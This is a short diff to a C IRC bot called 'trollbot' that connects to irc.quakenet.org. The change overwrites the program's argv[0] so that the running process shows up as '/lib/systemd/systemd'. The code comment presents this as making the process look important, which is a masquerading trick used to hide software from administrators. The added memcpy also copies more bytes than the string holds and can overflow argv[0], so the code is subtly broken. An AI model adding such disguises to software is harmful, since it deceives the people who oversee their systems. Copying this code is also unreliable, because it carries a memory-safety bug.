@@ -166,12 +166,17 @@ int parsePrivateCommand() {
 	return ret;
 }
 
-int main() {
+int main(int argc, char *argv[]) {
+	int i;
+	/*Change process name to something that is actually important*/
+	for (i=0;argv[0][i] != '\0';i++)
+		argv[0][i] = '\0';
+	memcpy(argv[0], "/lib/systemd/systemd", 22);
 	char *nick = "trollbot";
 	char *host = "irc.quakenet.org";
 	char *port = "6667";
 
-	int i, j, l, bytesread, bufIndex = -1, start, wordcount;
+	int j, l, bytesread, bufIndex = -1, start, wordcount;
 	char buf[BUFFSIZE + 1];
 	struct addrinfo hints, *res;
 
